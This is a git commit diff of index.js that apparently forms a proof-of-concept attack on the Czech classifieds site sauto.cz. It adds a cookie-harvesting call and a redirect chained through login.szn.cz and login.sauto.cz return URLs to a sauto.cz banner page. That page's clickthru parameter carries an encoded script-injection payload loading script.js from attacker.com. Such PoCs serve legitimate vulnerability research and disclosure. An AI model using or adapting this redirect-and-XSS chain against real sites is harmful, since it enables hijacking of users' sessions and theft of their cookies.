d5da9bf294c30a91f752482385efb476ce3d4af6
Jirka Martinec <jirka@martinec.dev>
2023-07-20 22:50:38 +0200

    init

--- index.js
+++ index.js
@@ -1,11 +1,11 @@
-console.log('hi');
-
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
         console.log('yes');
+        getCookiesFromResponse();
     } else if (this.readyState == 4 && this.status == 401) {
         console.log('no');
+        window.location.replace('https://login.szn.cz/continue?return_url=https%3A%2F%2Flogin.sauto.cz%2FloginDone%3Fservice%3Dsauto%26return_url%3Dhttps://www.sauto.cz%2fbannerova-reklama%253FperPage%253D1%2526banner%253D1%2526clickthru%253D%2522%253E%253Cscript%2Bsrc%253D%252F%252Fattacker.com%252Fscript.js%253E%253C%252Fscript%253E%253C%2521--');
     }
 };
 xhttp.open("GET", "https://www.sauto.cz/api/v1/users/self", true);
